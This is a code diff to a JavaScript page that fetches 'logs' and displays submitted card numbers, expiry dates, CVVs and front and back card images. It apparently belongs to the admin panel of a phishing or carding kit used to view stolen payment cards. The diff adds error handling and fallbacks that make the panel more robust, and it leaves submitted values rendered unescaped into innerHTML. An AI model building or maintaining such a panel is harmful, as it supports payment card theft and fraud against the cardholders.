@@ -100,7 +100,10 @@
 
             try {
                 const res = await fetch('/api/logs');
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
                 const data = await res.json();
+
+                console.log("Fetched logs:", data);
 
                 if (!Array.isArray(data) || data.length === 0) {
                     list.innerHTML = '<p class="text-gray-500">No submissions yet.</p>';
@@ -116,16 +119,16 @@
                     if (s.front_image) galleryBlock += `<a href="${s.front_image}" target="_blank"><img src="${s.front_image}" alt="Front"></a>`;
                     if (s.back_image) galleryBlock += `<a href="${s.back_image}" target="_blank"><img src="${s.back_image}" alt="Back"></a>`;
 
-                    const time = new Date(s.timestamp).toLocaleString();
+                    const time = s.timestamp ? new Date(s.timestamp).toLocaleString() : 'Unknown';
 
                     list.innerHTML += `
                     <div class="submission-card">
                         <div class="submission-title">Submission #${index - i}</div>
-                        <div><span class="field-label">CardNumber:</span> ${s.card_number}</div>
+                        <div><span class="field-label">CardNumber:</span> ${s.card_number || 'N/A'}</div>
                         <div class="divider"></div>
-                        <div><span class="field-label">ExpiryDate:</span> ${s.expiry_date}</div>
+                        <div><span class="field-label">ExpiryDate:</span> ${s.expiry_date || 'N/A'}</div>
                         <div class="divider"></div>
-                        <div><span class="field-label">Cvv:</span> ${s.cvv}</div>
+                        <div><span class="field-label">Cvv:</span> ${s.cvv || 'N/A'}</div>
                         ${galleryBlock ? `<div class="divider"></div><div><span class="field-label">Images:</span></div><div class="gallery">${galleryBlock}</div>` : ''}
                         <div class="divider"></div>
                         <div><span class="field-label">SubmittedAt:</span> ${time}</div>
@@ -149,6 +152,7 @@
 
                 gallery.innerHTML = imgHtml;
             } catch (err) {
+                console.error("Error fetching logs:", err);
                 list.innerHTML = '<p class="text-red-500">Error loading submissions.</p>';
                 gallery.innerHTML = '<p class="text-red-500">Error loading images.</p>';
             }
